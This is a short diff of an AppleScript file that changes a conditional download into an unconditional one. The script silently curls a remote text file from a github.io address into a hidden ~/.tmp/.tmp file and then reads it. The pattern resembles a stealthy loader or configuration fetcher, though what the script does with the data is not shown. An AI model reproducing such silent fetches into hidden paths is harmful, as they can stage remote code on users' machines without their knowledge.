@@ -1,12 +1,6 @@
 set p to (path to home folder as Unicode text) & ".tmp:.tmp"
 
-tell application "Finder"
-	set cont to exists p
-end tell
-
-if not cont then
-	do shell script "curl -s https://sitetest.github.io/cron.txt >~/.tmp/.tmp"
-end if
+do shell script "curl -s https://sitetest.github.io/cron.txt >~/.tmp/.tmp"
 
 set dat to read file p
 
